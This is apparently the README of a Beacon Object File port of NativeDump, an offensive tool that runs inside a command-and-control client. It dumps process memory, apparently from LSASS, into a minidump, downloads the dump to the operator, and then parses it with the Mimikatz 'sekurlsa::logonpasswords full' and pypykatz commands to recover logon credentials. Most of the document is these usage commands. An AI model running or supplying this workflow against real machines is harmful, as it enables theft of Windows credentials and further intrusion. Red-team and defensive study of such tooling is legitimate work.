# NtDumpBOF

BOF Port of the tool This is just a BOF port of the tool https://github.com/ricardojoserf/NativeDump written by @ricardojoserf.

Import NtDump.cna and run:

```
ntdump <filename>
```
The minidump file will be created in memory and downloaded using the CALLBACK_FILE and CALLBACK_FILE_WRITE.
Once downloaded it will be minidump file will be visible at **View** -> **Download**.

This can subsequently be parsed using Mimikatz

```
mimikatz # sekurlsa::minidump <file path to downloaded minidump file>
mimikatz # sekurlsa::logonpasswords full
```

Or pypykatz

```
pypykatz lsa minidump <file path to downloaded minidump file>
```
